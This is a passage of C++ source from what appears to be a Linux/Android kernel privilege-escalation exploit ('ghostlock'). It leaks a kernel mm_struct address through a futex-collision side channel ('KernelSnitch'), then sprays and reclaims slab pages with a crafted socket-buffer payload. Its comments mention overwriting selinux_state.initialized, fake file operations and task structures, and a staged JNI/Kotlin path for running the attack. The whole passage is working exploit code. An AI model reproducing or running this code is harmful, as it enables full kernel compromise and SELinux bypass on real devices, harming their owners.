                    pr_warning("waitpid leak child: %m\n");
                    (*in.leak_child).mark_reaped();
                    break;
                }
                long long waited = ms_since(&t_wait);
                uint32_t timeout_ms =
                        in.kernelsnitch_timeout_ms;
                if (static_cast<uint64_t>(waited) >= timeout_ms) {
                    pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
                    (void) (*in.leak_child).terminate_and_wait(SIGKILL);
                    break;
                }
                if (waited - last_beat >= 2000) {
                    size_t scan_done = glk_ks_dev_scan_done(*in.snitch);
                    size_t scan_total = glk_ks_dev_scan_total(*in.snitch);
                    if (scan_done > scan_total) scan_done = scan_total;
                    size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
                    const std::size_t futex_sz = glk_ks_dev_futex_sz();
                    if (scan_id > futex_sz) scan_id = futex_sz;
                    pr_info("[spray]   still finding collisions (%llds) %zu%% "
                            "(futex 0x%zx/0x%zx)...\n",
                            waited / 1000,
                            scan_total ? scan_done * 100 / scan_total : 0,
                            scan_id, futex_sz);
                    last_beat = waited;
                }
                usleep(50000);
            }
            if (wp == leak_pid &&
                (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
                pr_warning("leak child exit status=%d\n", leak_status);
            }
        }
        if (!glk_ks_dev_found_collisions(snitch)) {
            pr_warning("[spray] futex collisions not found\n");
            for (size_t i = 0; i < in.prepare->childs.size(); i++) {
                kill_child(in.prepare->childs[i]);
            }
            cleanup_page_prepare_state(in);
            return spray;
        }

        pr_info("[spray] futex collisions found +%lldms\n",
                ms_since(&t_spray));
        const std::uintptr_t leaked_raw = glk_ks_dev_leak(snitch);
        pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
                static_cast<std::size_t>(leaked_raw), ms_since(&t_spray));
        uintptr_t leaked = leaked_raw;
        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
        leaked |= static_cast<uintptr_t>(0xf) << 56;
        (in.current->last_mm_struct) = leaked;
        /* mm_structs live in the direct map */
        if (leaked == static_cast<uintptr_t>(-1) ||
            leaked < kernel::KERNELSNITCH_IDENTITY_START ||
            leaked >= in.direct_map_end) {
            pr_warning("KernelSnitch mm_struct leak failed\n");
            for (size_t i = 0; i < in.prepare->childs.size(); i++) {
                kill_child(in.prepare->childs[i]);
            }
            cleanup_page_prepare_state(in);
            return spray;
        }

        /* 泄漏已完成：共享区在返回时由 release_snitch 释放（比原先"回收之后"
         * 早一步；释放的是用户态映射，与内核 slab 回收无关）。 */
        spray.mm_struct = leaked;
        return spray;
    }

    uintptr_t land_with(const core::PageSprayInputs &in, SprayResult &spray,
                        const unsigned char *skb_payload,
                        std::size_t skb_payload_len) {
        const struct timespec &t_spray = spray.started;
        /* 地址守卫：spray_begin 与 land_with 之间地址只经调用方传递，这里复核。 */
        if (!spray.valid() ||
            spray.mm_struct == static_cast<uintptr_t>(-1) ||
            spray.mm_struct < kernel::KERNELSNITCH_IDENTITY_START ||
            spray.mm_struct >= in.direct_map_end) {
            pr_error("land_with: mm_struct 0x%zx rejected\n",
                     static_cast<size_t>(spray.mm_struct));
            return 0;
        }

        /* 拒收路径：杀掉 prepare 子进程、清准备状态、不回收页。 */
        auto reject = [&in]() noexcept -> uintptr_t {
            for (size_t i = 0; i < in.prepare->childs.size(); i++) {
                kill_child(in.prepare->childs[i]);
            }
            cleanup_page_prepare_state(in);
            return 0;
        };

        uintptr_t base = spray.mm_struct & ~(kernel::ORDER3_SIZE - 1);
        if (!prepare_skb_payload(in, base)) {
            return reject();
        }
        /* 页几何（fake_* 与接受判据）仍由 native 解析；若调用方给了全量字节，
         * 只覆盖发出去的缓冲区内容，不改任何地址。字节由 Kotlin 提供时，
         * 必须与 native 构造逐字节一致（host 向量即该判据）。 */
        if (skb_payload != nullptr) {
            if (skb_payload_len != kernel::SKB_SEND_SIZE) {
                pr_error("land_with: payload len %zu != %zu\n", skb_payload_len,
                         static_cast<size_t>(kernel::SKB_SEND_SIZE));
                return reject();
            }
            memcpy(in.skb_buffer->get(), skb_payload, skb_payload_len);
        }
        /* 页接受判据必须在这里，而不是只在直连的重试循环里：经 C API / JNI 的
         * 分步路径（discover → land → execute）不经过那个循环，跳过判据会把
         * 坏页直接拿去写 → 真机 panic。 */
        const memory::PayloadWriteLayout layout = {
            .parent = (in.current->fake_parent),
            .right = (in.current->fake_right),
            .left = (in.current->fake_left),
            .fops = (in.current->fake_fops),
        };
        if (!payload_write_layout_matches_request(&in.request, &layout)) {
            pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
                       in.request.preserve_child, layout.right);
            return reject();
        }
        if (!payload_write_layout_accepts_page(&in.request, &layout)) {
            pr_warning("page %016zx stores an even byte over "
                       "selinux_state.initialized; taking another\n", base);
            return reject();
        }

        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, in.current->reclaim.fd.data()));
        in.current->state = memory::PayloadPageState::Current;
        int32_t sndbuf = 1 << 20;
        setsockopt(in.current->reclaim.fd[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        int32_t reclaim_flags = fcntl(in.current->reclaim.fd[0], F_GETFL, 0);
        if (reclaim_flags >= 0) {
            fcntl(in.current->reclaim.fd[0], F_SETFL, reclaim_flags | O_NONBLOCK);
        }
        std::array<int32_t, 2> pcp_shaping_sv{};
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv.data()));

        struct iovec iov{};
        iov.iov_base = in.skb_buffer->get();
        iov.iov_len = kernel::SKB_SEND_SIZE;

        struct msghdr msg{};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

        kernel::pin_to_core(static_cast<size_t>(in.main_cpu));
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        for (size_t i = 0; i < in.pre->childs.size(); i++) {
            SYSCHK(close(in.pre->memfds[i]));
            in.pre->memfds[i] = -1;
        }
        for (size_t i = 0; i < in.post->childs.size() - 1; i++) {
            SYSCHK(close(in.post->memfds[i]));
            in.post->memfds[i] = -1;
        }
        for (size_t i = 0; i < in.spray->childs.size(); i += (*in.mm_objs_per_slab)) {
            SYSCHK(close(in.spray->memfds[i]));
            in.spray->memfds[i] = -1;
        }

        SYSCHK(close(pcp_shaping_sv[0]));
        SYSCHK(close(pcp_shaping_sv[1]));
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        /* Reap the snitch child's memfd: closing it is what drops the
         * mm_struct reference the spray depends on (the previous SYSCHK_pr
         * expansion dropped the close call). */
        const int32_t leak_fd = (*in.leak_memfd).release();
        if (close(leak_fd) != 0) {
            pr_error("SYSCHK(close(memfd_leak)): %m\n");
        }
        (*in.leak_memfd).reset();
        for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
            errno = 0;
            ssize_t sent = sendmsg(in.current->reclaim.fd[0], &msg, MSG_DONTWAIT);
            if (sent <= 0) {
                break;
            }
        }
        pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));

        for (size_t i = 0; i < in.prepare->childs.size(); i++) {
            SYSCHK(close(in.prepare->memfds[i]));
            in.prepare->memfds[i] = -1;
            kill_child(in.prepare->childs[i]);
        }

        /* 落页成功才把 base 写回槽位：`run_main_route_threads` 用 `current->base`
         * 非零作为"页已就绪"的判据，并据此刷新 route 的 fake_task/fake_lock。
         * 直连路径由 `attack_write` 事后赋值；经 C API / JNI 的分步路径没有那一步，
         * 漏掉这里会让 route 拿喷射前的 0 去下毒 → 真机 panic（对拍时抓到）。 */
        (in.current->base) = base;
        return base;
    }

    uintptr_t prepare_good_kernel_page(const core::PageSprayInputs &in) {
        uint32_t max_attempts = in.prepare_max_attempts;
        struct timespec t_good;
        clock_gettime(CLOCK_MONOTONIC, &t_good);
        struct timespec deadline = t_good;
        uint64_t timeout_ns =
                static_cast<uint64_t>(in.prepare_timeout_ms) * 1000000ULL;
        deadline.tv_sec += static_cast<time_t>(timeout_ns / 1000000000ULL);
        deadline.tv_nsec += static_cast<long>(timeout_ns % 1000000000ULL);
        if (deadline.tv_nsec >= 1000000000L) {
            deadline.tv_sec++;
            deadline.tv_nsec -= 1000000000L;
        }
        for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
            /* 两段形状与 Kotlin 侧编排一致：先喷页取地址，再落页。
             * "整页重来"的重试语义保留在本次调用内（Kotlin 接管后由它驱动）。 */
            SprayResult spray = spray_begin(in);
            uintptr_t base = spray.valid() ? land_with(in, spray) : 0;
            if (base) {
                pr_info("prepare_kernel_page ok attempt=%u +%lldms\n", attempt,
                        ms_since(&t_good));
                return base;
            }
            struct timespec now;
            clock_gettime(CLOCK_MONOTONIC, &now);
            if (now.tv_sec > deadline.tv_sec ||
                (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
                pr_warning("prepare_kernel_page timeout after %u attempts\n", attempt);
                break;
            }
            pr_warning("prepare_kernel_page retry %u/%u +%lldms\n", attempt,
                       max_attempts, ms_since(&t_good));
        }
        return 0;
    }
} // namespace ghostlock::support
